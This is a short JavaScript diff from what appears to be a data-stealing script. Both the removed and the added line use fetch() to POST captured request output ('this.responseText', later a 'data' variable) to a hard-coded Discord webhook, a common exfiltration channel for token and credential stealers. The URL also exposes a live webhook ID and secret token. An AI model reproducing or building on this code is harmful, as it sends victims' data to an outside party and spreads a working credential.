@@ -15,7 +15,7 @@ a.onreadystatechange = function () {
             }
         ]
 
-        fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":JSON.stringify({"content":this.responseText})});
+        fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":data});
     }
 };
 
